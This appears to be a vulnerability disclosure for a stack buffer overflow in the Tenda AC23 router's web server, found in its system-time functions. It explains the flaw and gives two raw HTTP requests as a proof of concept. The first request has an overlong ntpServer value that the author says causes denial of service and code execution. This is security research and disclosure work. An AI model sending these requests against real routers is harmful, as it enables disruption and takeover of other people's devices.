# Tenda AC23(V16.03.07.45_cn) has a Stack Buffer Overflow Vulnerability

## 1.Product 

![image-20220924150554791](https://github.com/jingping911/tendaAC23overflow/blob/main/1.jpg)

1. **product information: https://www.tenda.com.cn/** 
2. **firmware download:https://www.tenda.com.cn/download/detail-3420.html**

----

## 2.**Firmware**

**Hardware version:V1.0**

**Software version:V16.03.07.45**

## 3.vulnerability details

The vulnerability is in `/bin/httpd`, the function `formSetSysTime` `formGetSysTime`. The function `formSetSysTime` can set nvram val `sys.timefixper` to `v3`, which can be set through POST parameter `timePeriod`

![image-20220924150554791](https://github.com/jingping911/tendaAC23overflow/blob/main/2.png)

and in function `formGetSysTime`, the function calls `GetValue(“sys.timefixer”, v16)` to set the string to `v16` which is on the stack. So there is a stack overflow  vulnerability. 

By analyzing the funtion `GetValue` and `SetValue`, the max size of the string we can get from the function `GetValue` is `0x5DC`. It’s bigger than the size of `v16`, so there will be a bufferoverflow vulnerability. 

![image-20220924150554791](https://github.com/jingping911/tendaAC23overflow/blob/main/3.png)

## 4.poc

1. You need to login and **replace the Cookie: password filed in poc**.
2. By sending  poc1 and poc2 (remember to send poc2), it can cause dos and rce. 

```
POST /goform/SetSysTimeCfg HTTP/1.1
Host: 192.168.0.1
Content-Length: 105
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.0.1
Referer: http://192.168.0.1/system_time.html?random=0.836749282878861&
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: password=25d55ad283aa400af464c76d713c07admvpcvb
Connection: close

timeType=sync&timePeriod=86400&ntpServer=time.windows.comaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&timeZone=20%3A00&time=2000-01-01%2000%3A58%3A22
```

```
GET /goform/GetSysTimeCfg?0.6678734602604752 HTTP/1.1
Host: 192.168.0.1
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
X-Requested-With: XMLHttpRequest
Referer: http://192.168.0.1/system_time.html?random=0.836749282878861&
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: password=25d55ad283aa400af464c76d713c07admvpcvb
Connection: close

```

![image-20220924150554791](https://github.com/jingping911/tendaAC23overflow/blob/main/4.png)

----

### 5.Author

*Wangjingping*
